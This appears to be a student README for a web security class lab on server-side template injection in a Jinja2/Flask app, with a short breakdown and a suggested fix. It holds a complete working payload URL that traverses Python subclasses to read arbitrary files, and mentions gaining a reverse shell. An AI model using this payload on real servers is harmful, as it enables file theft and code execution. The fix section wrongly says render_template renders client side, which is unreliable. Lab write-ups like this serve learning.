# Jinja2-ExploitMe
[BEW 2.3: Web Security]

-----

## Vulnerabilities found so far:

1. `{{int1 * int2}}` will multiply 2 ints

1. `{{int1 * int2|string}}` will output the int2 for int1 times

3. `http://localhost:5000/?param=./hack.txt&exploit={{%20config.items().__class__.__mro__[1].__subclasses__()[91].__subclasses__()[0](request[request.args.param],%20request[request.args.param]).get_data(request.args.param|string)}}` exploits access to python subclasses and exposes the file with the name targetted in `param`

4. RCE via Python can be executed, including config.items(), subprocessor package access, and access to request.* functionality like request.environ

---

## Breakdown

1. {{}} escapes Jinja template, gets read as python server side

1. |string is the Jinja truncation syntax for strings

1. Read through the python config we now have access to and avoid characters that would be read as html or the wrong type and cause errors.  Traverse python3 super/sub classes with `__mro__` and `__subclasses__()`.  The indexes are environment and version specific but I access the python file reader, then load the file specified in the `param` before the `exploit` query by specifying my request's own query parameter.  This helps with escaped strings and typing, and lets me make it into a reusable script where the file name is only changed in one place.

1. Same as 3, but we use the python subprocessor class to gain reverse shell access instead. 

___

## Fix:

`return render_template("app.html", exploit=exploit)` 

instead of 

`return render_template_string("app.html", exploit=exploit)`

which will render the template client side instead, keeping user-inputted code away from the server.  Also sanitizing user inputs.  